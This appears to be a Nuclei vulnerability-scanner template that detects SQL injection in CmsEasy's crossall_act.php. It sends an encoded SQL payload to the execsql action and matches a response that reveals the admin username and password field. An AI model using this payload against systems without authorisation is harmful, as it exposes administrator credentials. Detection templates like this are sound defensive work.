id: cmseasy-crossall-sqli
info:
  name: CmsEasy crossall_act.php SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in CmsEasy's crossall_act.php endpoint.
http:
  - method: GET
    path:
      - "{{BaseURL}}/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"userid\":\"1\""
          - "\"username\":\"admin\""
          - "password"
          - "\u7ba1\u7406\u5458"
